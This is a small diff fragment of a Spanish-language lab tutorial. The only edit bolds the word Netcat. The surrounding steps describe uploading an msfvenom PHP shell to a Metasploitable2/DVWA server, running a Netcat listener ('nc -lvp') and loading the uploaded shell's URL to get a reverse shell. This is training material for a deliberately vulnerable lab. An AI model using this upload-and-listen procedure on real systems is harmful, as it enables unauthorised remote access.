@@ -8,7 +8,7 @@ Confirmar que se creó el shell corriendo el comando `ls`.
 
 Subir el shell al servidor Metasploitable2.  
 
-Abrir otra ventana de terminal para ejecutar una instancia de Netcat. Netcat es una utilidad que va a escuchar por cualquier petición al puerto que definimos anteriormente.  
+Abrir otra ventana de terminal para ejecutar una instancia de **Netcat**. Netcat es una utilidad que va a escuchar por cualquier petición al puerto que definimos anteriormente.  
 `nc -lvp <EL PUERTO QUE PUSIMOS ARRIBA>`
 
 Ahora navegar a la página donde se subió el shell. Ejemplo: http://192.168.100.93/dvwa/hackable/uploads/msfvenom-shell.php  
